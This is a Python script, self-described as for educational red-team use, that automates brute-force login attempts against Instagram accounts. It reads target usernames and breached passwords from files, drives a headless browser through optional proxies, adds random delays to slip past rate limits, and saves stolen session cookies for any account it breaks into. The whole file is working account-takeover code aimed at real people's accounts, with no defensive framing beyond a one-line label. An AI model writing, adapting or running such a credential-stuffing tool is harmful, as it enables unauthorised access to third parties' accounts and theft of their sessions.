#!/usr/bin/env python3
"""
🔥 Brute-Force Instagram Login Script
🎯 Educational Redteam Use Only

This script attempts to brute-force Instagram login using breached credentials.
"""

import asyncio
import json
import logging
from pathlib import Path
from typing import List, Dict, Optional
from playwright.async_api import async_playwright
import aiofiles
import time
import random

# Constants
TARGETS_FILE = "brute_targets.json"
PASSWORDS_FILE = "passwords/common_breached.txt"
SESSIONS_DIR = Path("sessions")
LOGS_DIR = Path("logs")
PROXY_CONFIG = Path("config/proxy_config.json")

# Setup directories
SESSIONS_DIR.mkdir(exist_ok=True)
LOGS_DIR.mkdir(exist_ok=True)

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(
            LOGS_DIR / f"brute_attempts_{time.strftime('%Y%m%d')}.log"
        ),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("BruteForceInstagram")


async def load_targets() -> List[Dict[str, str]]:
    """Load target usernames and emails from JSON file"""
    async with aiofiles.open(TARGETS_FILE, mode="r", encoding="utf-8") as f:
        return json.loads(await f.read())


async def load_passwords() -> List[str]:
    """Load passwords from breached password file"""
    async with aiofiles.open(PASSWORDS_FILE, mode="r", encoding="utf-8") as f:
        return [line.strip() for line in await f.readlines() if line.strip()]


async def save_session(username: str, session_data: Dict[str, Optional[str]]):
    """Save valid session data to file"""
    session_file = SESSIONS_DIR / f"valid_session_{username}.json"
    async with aiofiles.open(session_file, mode="w", encoding="utf-8") as f:
        await f.write(json.dumps(session_data, indent=2))
    logger.info(f"✅ Session saved: {session_file}")


# Added debug logging to identify potential issues
logger.debug("🔍 Debugging script execution")


async def brute_force_login(
    target: Dict[str, str], passwords: List[str], proxy: Optional[str] = None
):
    """Attempt to brute-force login for a single target"""
    username = target.get("username", "")
    email = target.get("email", "")

    logger.info(f"🎯 Starting brute-force for: {username} ({email})")

    async with async_playwright() as p:
        logger.debug("🔍 Launching browser")
        browser = await p.chromium.launch(
            headless=True, proxy={"server": proxy} if proxy else None
        )
        context = await browser.new_context()
        page = await context.new_page()

        for password in passwords:
            try:
                logger.info(f"🔑 Trying password: {password} for {username}")

                # Navigate to Instagram login page
                logger.debug("🌐 Navigating to Instagram login page")
                await page.goto("https://www.instagram.com/accounts/login/")

                # Fill in login form
                logger.debug("📝 Filling in login form")
                await page.fill("input[name='username']", email or username)
                await page.fill("input[name='password']", password)

                # Submit form
                logger.debug("🚀 Submitting login form")
                await page.click("button[type='submit']")

                # Wait for response or error
                logger.debug("⏳ Waiting for response")
                await page.wait_for_timeout(5000)  # 5 seconds

                # Check for successful login
                logger.debug("🔍 Checking login success")
                if page.url != "https://www.instagram.com/accounts/login/":
                    cookies = await context.cookies()
                    session_data = {
                        "sessionid": next(
                            (
                                c.get("value")
                                for c in cookies
                                if c.get("name") == "sessionid"
                            ),
                            None,
                        ),
                        "csrftoken": next(
                            (
                                c.get("value")
                                for c in cookies
                                if c.get("name") == "csrftoken"
                            ),
                            None,
                        ),
                        "ds_user_id": next(
                            (
                                c.get("value")
                                for c in cookies
                                if c.get("name") == "ds_user_id"
                            ),
                            None,
                        ),
                    }

                    if session_data["sessionid"]:
                        await save_session(username, session_data)
                        logger.info(
                            f"✅ Login successful for {username} with password: {password}"
                        )
                        await browser.close()
                        return

                # Smart wait to avoid rate limits
                delay = random.uniform(2, 5)
                logger.info(f"⏳ Waiting {delay:.2f}s before next attempt")
                await asyncio.sleep(delay)

            except Exception as e:
                logger.error(
                    f"❌ Error during login attempt for {username}: {e}")

        await browser.close()
        logger.warning(f"❌ FAILED: No valid password found for {username}")


async def main():
    """Main brute-force execution"""
    logger.debug("🔍 Loading targets and passwords")
    targets = await load_targets()
    passwords = await load_passwords()

    # Load proxy configuration if available
    proxy = None
    if PROXY_CONFIG.exists():
        async with aiofiles.open(PROXY_CONFIG, mode="r", encoding="utf-8") as f:
            proxy_config = json.loads(await f.read())
            proxy = proxy_config.get("proxy_url")
            logger.info(f"🌐 Using proxy: {proxy}")

    # Brute-force each target
    for target in targets:
        logger.debug(f"🔍 Processing target: {target}")
        await brute_force_login(target, passwords, proxy)

    logger.debug("✅ Script execution completed")


if __name__ == "__main__":
    asyncio.run(main())
